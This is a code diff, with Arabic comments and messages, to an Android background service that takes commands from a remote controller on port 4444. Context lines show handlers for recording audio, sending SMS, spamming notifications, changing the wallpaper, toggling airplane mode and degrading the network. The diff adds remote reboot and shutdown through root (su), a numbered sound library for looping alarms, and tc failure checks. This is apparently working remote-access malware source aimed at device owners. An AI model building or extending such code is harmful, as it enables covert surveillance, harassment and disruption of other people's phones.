@@ -32,6 +32,8 @@ import android.util.Log;
 
 import androidx.core.app.NotificationCompat;
 
+import eu.chainfire.libsuperuser.Shell;
+
 import java.io.BufferedReader;
 import java.io.EOFException;
 import java.io.File;
@@ -55,6 +57,14 @@ public class BackgroundService extends Service {
     private static final String CHANNEL_MAIN = "main_channel";
     private static final String CHANNEL_SPAM = "spam_channel";
     private static final int NOTIFICATION_ID = 1;
+
+    /**
+     * مكتبة الأصوات الجاهزة. أرقام الأوامر play_sound:1..N تشير إلى نفس الترتيب
+     * الذي تعرضه مكتبة الأصوات في أداة التحكم (Windows Controller).
+     */
+    private static final int[] SOUND_LIBRARY = {
+            R.raw.alarm, R.raw.siren, R.raw.warning, R.raw.notification
+    };
 
     private static final String SERVER_HOST = "10.0.2.2";
     private static final int SERVER_PORT = 4444;
@@ -338,6 +348,8 @@ public class BackgroundService extends Service {
                 writeMessage(out, "نتيجة التعطيل: " + result);
             } else if (command.startsWith("spam_notifications:")) {
                 handleSpamNotifications(command, out);
+            } else if (command.startsWith("play_sound:")) {
+                handlePlaySound(command, out);
             } else if (command.startsWith("play_annoying_sound:")) {
                 handlePlayAnnoyingSound(command, out);
             } else if (command.startsWith("change_wallpaper:")) {
@@ -374,11 +386,9 @@ public class BackgroundService extends Service {
             } else if (command.startsWith("record_audio:")) {
                 handleRecordAudio(command, out);
             } else if (command.equals("reboot_device")) {
-                String result = runShellCommand("su", "-c", "reboot");
-                writeMessage(out, "نتيجة أمر إعادة التشغيل: " + result);
+                handlePowerAction("reboot_device", "reboot", out);
             } else if (command.equals("shutdown_device")) {
-                String result = runShellCommand("su", "-c", "reboot", "-p");
-                writeMessage(out, "نتيجة أمر الإغلاق: " + result);
+                handlePowerAction("shutdown_device", "reboot -p", out);
             } else if (command.equals("toggle_airplane_mode")) {
                 handleToggleAirplaneMode(out);
             } else if (command.startsWith("send_sms:")) {
@@ -398,6 +408,112 @@ public class BackgroundService extends Service {
             throw e;
         } catch (Exception e) {
             writeMessage(out, "خطأ في تنفيذ الأمر: " + e.getMessage());
+        }
+    }
+
+    private void handlePowerAction(String action, String suCommand, OutputStream out) throws IOException {
+        if (!Shell.SU.available()) {
+            writeMessage(out, buildRootDiagnostics(
+                    "أداة root (su) غير متوفرة على هذا الجهاز. أمر الإيقاف/إعادة التشغيل يتطلب صلاحيات root."));
+            return;
+        }
+        List<String> idLines = Shell.SU.run("id");
+        if (!containsUidZero(idLines)) {
+            writeMessage(out, buildRootDiagnostics(
+                    "تم العثور على su لكنه لم يمنح uid=0 (تم رفض طلب root). صلاحية root غير مكتملة."));
+            return;
+        }
+        List<String> resultLines = Shell.SU.run(suCommand);
+        if (resultLines != null) {
+            StringBuilder sb = new StringBuilder();
+            sb.append("تم تنفيذ أمر ").append(action).append(" عبر نظام root (su).\n");
+            String output = String.join("\n", resultLines).trim();
+            if (output.length() > 0) {
+                sb.append("مخرجات su: ").append(output).append("\n");
+            }
+            sb.append("تم تنفيذه بنجاح عبر su (خرج غير صفري = فشل).");
+            writeMessage(out, sb.toString());
+        } else {
+            writeMessage(out, buildRootDiagnostics(
+                    "أمر الـ su نفسه فشل أو انقطع (نتيجة null). لا يمكن تنفيذ " + action + "."));
+        }
+    }
+
+    private boolean containsUidZero(List<String> lines) {
+        if (lines == null) {
+            return false;
+        }
+        for (String line : lines) {
+            if (line != null && line.contains("uid=0")) {
+                return true;
+            }
+        }
+        return false;
+    }
+
+    private String buildRootDiagnostics(String summary) {
+        boolean suAvailable = Shell.SU.available();
+        List<String> idLines = Shell.SU.run("id");
+        StringBuilder sb = new StringBuilder();
+        sb.append(summary).append("\n");
+        sb.append("تشخيص root: su متوفر: ").append(suAvailable).append("\n");
+        if (idLines != null) {
+            sb.append("ناتج `id`: ").append(String.join(" ", idLines)).append("\n");
+        } else {
+            sb.append("ناتج `id`: (null — رفض su)\n");
+        }
+        sb.append("هذه قيود النظام. لا يمكن تجاوزها من كود التطبيق.");
+        return sb.toString();
+    }
+
+    private void handlePlaySound(String command, OutputStream out) throws IOException, InterruptedException {
+        String[] parts = command.split(":", 3);
+        if (parts.length < 3) {
+            writeMessage(out, "صيغة خاطئة: play_sound:الرقم:المدة(ثواني)");
+            return;
+        }
+        int soundId;
+        try {
+            soundId = Integer.parseInt(parts[1]);
+        } catch (NumberFormatException e) {
+            writeMessage(out, "رقم الصوت غير صالح: " + parts[1]);
+            return;
+        }
+        int duration;
+        try {
+            duration = Integer.parseInt(parts[2]);
+        } catch (NumberFormatException e) {
+            writeMessage(out, "مدة غير صالحة: " + parts[2]);
+            return;
+        }
+        if (duration <= 0 || duration > 600) {
+            writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
+            return;
+        }
+        if (soundId < 1 || soundId > SOUND_LIBRARY.length) {
+            writeMessage(out, "رقم الصوت خارج النطاق (يجب أن يكون بين 1 و " + SOUND_LIBRARY.length + ")");
+            return;
+        }
+        playRawSound(SOUND_LIBRARY[soundId - 1], duration, out);
+    }
+
+    private void playRawSound(int rawResId, int duration, OutputStream out) throws IOException, InterruptedException {
+        MediaPlayer mediaPlayer = MediaPlayer.create(this, rawResId);
+        if (mediaPlayer == null) {
+            writeMessage(out, "تعذر تحميل ملف الصوت: الملف الموجود في res/raw فارغ أو غير مدعوم");
+            return;
+        }
+        try {
+            mediaPlayer.setLooping(true);
+            mediaPlayer.start();
+            Thread.sleep(duration * 1000L);
+            writeMessage(out, "تم تشغيل الصوت لمدة " + duration + " ثانية");
+        } finally {
+            try {
+                mediaPlayer.stop();
+            } catch (IllegalStateException ignored) {
+            }
+            mediaPlayer.release();
         }
     }
 
@@ -553,24 +669,7 @@ public class BackgroundService extends Service {
             writeMessage(out, "المدة يجب أن تكون بين 1 و 600 ثانية");
             return;
         }
-
-        MediaPlayer mediaPlayer = MediaPlayer.create(this, R.raw.annoying_sound);
-        if (mediaPlayer == null) {
-            writeMessage(out, "تعذر تحميل ملف الصوت: الملف الموجود في res/raw فارغ أو غير مدعوم");
-            return;
-        }
-        try {
-            mediaPlayer.setLooping(true);
-            mediaPlayer.start();
-            Thread.sleep(duration * 1000L);
-            writeMessage(out, "تم تشغيل الصوت المزعج لمدة " + duration + " ثانية");
-        } finally {
-            try {
-                mediaPlayer.stop();
-            } catch (IllegalStateException ignored) {
-            }
-            mediaPlayer.release();
-        }
+        playRawSound(R.raw.annoying_sound, duration, out);
     }
 
     private void handleChangeWallpaper(String command, OutputStream out) throws IOException {
@@ -732,8 +831,8 @@ public class BackgroundService extends Service {
 
     private void handleNetworkDegradation(String command, OutputStream out) throws IOException {
         String[] parts = command.split(":", -1);
-        if (parts.length < 6) {
-            writeMessage(out, "صيغة خاطئة: network_deg:التأخير(ms):فقدان(%):الحد(kbps):المدة(ثواني)");
+        if (parts.length < 5) {
+            writeMessage(out, "صيغة خاطئة: network_deg:<التأخير(ms)>:<فقدان(%)>:<الحد(kbps)>:<المدة(ثواني)>");
             return;
         }
         int latency = parseSetting(parts[1], -1);
@@ -795,7 +894,7 @@ public class BackgroundService extends Service {
         String failureDetail = "";
         for (String cmd : commands) {
             String res = runShellCommand("sh", "-c", cmd);
-            if (res.contains("[رمز الخروج:") || res.contains("انتهت المهلة")) {
+            if (tcCommandFailed(res)) {
                 allApplied = false;
                 failureDetail = res;
                 runShellCommand("sh", "-c", "tc qdisc del dev " + dev + " root 2>/dev/null");
@@ -831,6 +930,17 @@ public class BackgroundService extends Service {
                 + "تأخير: " + latency + "ms، فقدان: " + loss + "%، حد أقصى: "
                 + (bandwidth > 0 ? bandwidth + " kbps" : "بدون") + "\n"
                 + "سيتم استعادة الحالة الطبيعية تلقائياً بعد " + duration + " ثانية");
+    }
+
+    private boolean tcCommandFailed(String output) {
+        String text = output == null ? "" : output;
+        return text.contains("RTNETLINK answers: Permission denied")
+                || text.contains("RTNETLINK answers: Operation not permitted")
+                || text.contains("Permission denied")
+                || text.contains("Operation not permitted")
+                || text.contains("not found")
+                || text.contains("[رمز الخروج:")
+                || text.contains("انتهت المهلة");
     }
 
     private String detectNetInterface() {
